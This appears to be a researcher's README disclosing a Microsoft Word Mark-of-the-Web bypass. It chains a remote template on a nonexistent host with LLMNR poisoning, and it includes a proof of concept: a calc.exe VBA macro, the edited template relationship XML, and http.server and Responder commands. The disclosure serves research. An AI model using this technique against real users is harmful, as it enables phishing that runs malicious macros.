# Microsoft Word Intranet MOTW Bypass

# New Unpatched Intranet Mark-of-the-Web Bypass
By [Ruben Enkaoua](https://x.com/rubenlabs)
<br>
<br>

#### Description
<br>

By default, Microsoft Word remotely retrieved templates cannot execute macros when called, for security reasons, whether from a local network or from Internet - [Source (MSDN)](https://learn.microsoft.com/en-us/microsoft-365-apps/security/internet-macros-blocked#files-centrally-located-on-a-network-share-or-trusted-website)<br><br>
In a local network, when a `.dotm` document is called as a template from a local server, the macro will be blocked unless the location is added to the Local Intranet security zone (the same principle as trusted sites in `inetcpl.cpl`).
<br><br>

<p align="center">
  <img width="700" height="120" alt="image" src="https://github.com/user-attachments/assets/d81b287a-e1fa-4a51-9c7d-a503b4ce6ecd" />
</p>
<br>

The `.dotm` template file comes from an untrusted location (It can be a server in the local network) and macros are disabled. This doesn't change whether it's fetched by IP or by hostname, the document remains untrusted (tested in a DC hosting the template and queried by its hostname).

**However**, if a `.docx` document is querying a remote `.dotm` template using a **nonexistent** server name, it will issue a LLMNR request. By poisoning that request, the client can retrieve the template from an attacker controlled server, making the template trusted and restoring the `Enable Macros` button. The LLMNR poisoning causes the server to be considered trusted, allowing an Intranet Mark-of-the-Web bypass and enabling phishing to trick victims into executing VBScript code.

Note: Exploitable even if the `.docx` document is downloaded from Internet.

The Microsoft Security Response Center did not consider this issue to be a vulnerability.<br><br>


#### Steps to reproduce
<br>

> Create the `.dotm` template file

+ Create a new word document and go to the Developer tab (If not enabled, it could be done from Options > Customize Ribbon > Enable Developer).
+ Then create under This Document a VB macro applied to “This Document”. The macro will apply to the document with `Document_Open()`

```vb
Private Sub Document_Open()
  Shell "calc.exe", vbNormalFocus
End Sub
```
+ Save the `.dotm` template to a distant HTTP server
<br>

> Create the `.docx` base file

+ Create a simple `.docx` Microsoft Word file
+ Unzip it
+ Open `./word/_rels/settings.xml.rels` and change the template address

```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships
	xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
	<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="http://NOT-EXISTING-SERVER/template-poc.dotm" TargetMode="External"/>
</Relationships>
```
+ Re-zip your file. Don't forget to add a `.docx` extension back.
<br>

> Run the servers

+ Run the HTTP server first, serving the template

```bash
python3 -m http.server 80
```

+ Run the responder server on the same machine

```bash
sudo responder -I eth0 -v
```
<br>

> Execution

Open the `.docx` Word file. The `Enable Macro` button is not blocked.<br><br>

#### POC
<br>

> Regular Situation, no Bypass

<br>

![4-remote-template-blocked-by-motw](https://github.com/user-attachments/assets/52673a53-affd-46ec-8c12-f6beaa594c79)

<br>

> Bypass Vulnerability

<br>

![5-remote-template-bypass-motw](https://github.com/user-attachments/assets/ba6bcd71-bb33-42bc-b85e-8cad7b59c9d6)<br><br>

#### Notes
<br>
This code is for educational and research purposes only.<br>
The author takes no responsibility for any misuse of this code.
